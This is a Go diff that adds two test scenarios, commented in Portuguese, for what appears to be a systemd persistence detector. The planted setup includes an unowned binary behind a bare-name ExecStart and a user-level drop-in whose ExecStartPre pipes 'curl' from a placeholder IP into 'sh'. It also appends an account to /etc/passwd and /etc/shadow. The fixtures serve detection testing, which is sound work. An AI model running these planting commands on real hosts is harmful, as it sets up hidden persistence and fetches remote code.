@@ -175,3 +175,47 @@ func init() {
 		Exit: 2,
 	})
 }
+
+func init() {
+	// #1 desta rodada, virado cenário: ExecStart de NOME NU, sem ExecSearchPath
+	// e sem PATH próprio. O systemd resolve contra um PATH fixo (/usr/local/sbin,
+	// /usr/sbin, …); o binário dropado em /usr/sbin — diretório de PACOTE — não
+	// tem dono. Antes do conserto "synctool" ficava nome nu (sem "/"), a pergunta
+	// de propriedade nem era feita e unit_unowned não se formava: FN. A imagem
+	// tem dpkg, então "sem dono" é uma pergunta respondível.
+	Register(Scenario{
+		ID:     "J7-nome-nu-path-padrao",
+		Desc:   "ExecStart de nome nu resolve contra o PATH fixo; binário sem-dono em /usr/sbin vira unit_unowned",
+		Images: servicos,
+		Plant: `printf '[Service]\nExecStart=synctool --daemon\n' > /etc/systemd/system/syncd.service
+			printf '#!/bin/sh\nexit 0\n' > /usr/sbin/synctool
+			chmod +x /usr/sbin/synctool`,
+		Expect: []Expect{
+			{ID: "persist.unit_unowned", Sev: "CRITICAL", Subject: "syncd.service", Evidence: "/usr/sbin/synctool"},
+		},
+		Exit: 2,
+	})
+}
+
+func init() {
+	// #5 desta rodada, virado cenário: DROP-IN de unit de USUÁRIO por-home. Um
+	// ~/.config/systemd/user/beacon.service.d/ acrescenta um ExecStartPre que
+	// baixa-e-executa — persistência que roda no login do usuário. Antes do
+	// conserto o loop de user só via arquivos isUnitName (não recursava no .d/),
+	// e o drop-in passava invisível: FN. O passwd ganha um usuário com home para
+	// o laço de homes achar.
+	Register(Scenario{
+		ID:     "J8-dropin-user-por-home",
+		Desc:   "drop-in em ~/.config/systemd/user/*.service.d/ com ExecStartPre malicioso é visto",
+		Images: servicos,
+		Plant: `echo 'appuser:x:1001:1001::/home/appuser:/bin/bash' >> /etc/passwd
+			echo 'appuser:!:19000:0:99999:7:::' >> /etc/shadow
+			mkdir -p /home/appuser/.config/systemd/user/beacon.service.d
+			printf '[Service]\nExecStart=/usr/bin/true\n' > /home/appuser/.config/systemd/user/beacon.service
+			printf '[Service]\nExecStartPre=/bin/sh -c "curl -s http://198.51.100.9/u | sh"\n' > /home/appuser/.config/systemd/user/beacon.service.d/10-x.conf`,
+		Expect: []Expect{
+			{ID: "persist.unit_exec_suspect", Sev: "CRITICAL", Subject: "beacon.service"},
+		},
+		Exit: 2,
+	})
+}
